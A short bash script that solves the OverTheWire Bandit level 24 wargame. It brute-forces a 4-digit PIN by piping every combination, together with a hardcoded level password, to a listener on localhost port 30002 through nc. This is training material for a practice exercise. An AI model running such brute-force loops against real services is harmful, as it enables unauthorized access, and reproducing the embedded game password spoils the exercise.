#!/bin/bash
# OvertheWire Bandit Level 24

echo "Sending numbers now!"
# Bruteforce using a for loop for all possible combinations from 0000 to 9999
for i in {0000..9999}
do
echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}
# Pipe the bruteforce attempts into port 30002
#nc connection is still listening after the intial connection
done | nc localhost 30002
